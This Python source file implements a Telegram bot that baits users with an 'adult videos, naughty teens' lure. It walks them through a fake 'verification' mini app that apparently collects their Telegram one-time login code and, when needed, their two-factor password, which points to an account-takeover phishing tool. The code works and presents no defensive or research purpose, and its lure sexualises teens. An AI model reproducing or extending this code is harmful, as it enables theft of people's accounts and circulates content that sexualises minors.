import os
import sys
import asyncio
import logging
from dotenv import load_dotenv
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes
)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MINI_APP_URL = os.getenv("MINI_APP_URL")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"User {update.effective_user.id} started the bot")

    keyboard = [
        [KeyboardButton("🔞 Verify & Watch 18+", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    await update.message.reply_text(
        "🔥 Steamy 18+ Vide0s | Naughty Teens Home 🧏\n\nClick below to verify your account!",
        reply_markup=reply_markup
    )


async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = update.effective_message.web_app_data.data
    user_id = update.effective_user.id

    logger.info(f"Received from user {user_id}: {data}")

    # OTP verified, no 2FA needed
    if data == "verified:success":
        await update.effective_message.reply_text(
            "✅ Verification complete! You now have full access!\n\nEnjoy the videos! 🎉"
        )

    # OTP verified but 2FA required — send 2FA mini app button
    elif data == "otp_verified:needs_2fa":
        keyboard = [
            [KeyboardButton("🔐 Enter 2FA Password", web_app=WebAppInfo(url=MINI_APP_URL + "twofa.html"))]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.effective_message.reply_text(
            "✅ Code verified! Your account has 2FA enabled.\n\nClick below to enter your password.",
            reply_markup=reply_markup
        )

    # 2FA verified
    elif data == "verified:2fa_success":
        await update.effective_message.reply_text(
            "✅ 2FA verified! You now have full access!\n\nEnjoy the videos! 🎉"
        )


def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(
        MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data)
    )

    application.run_polling()


if __name__ == "__main__":
    # Fix for Python 3.10+ on Windows — prevents "no current event loop" error
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    main()
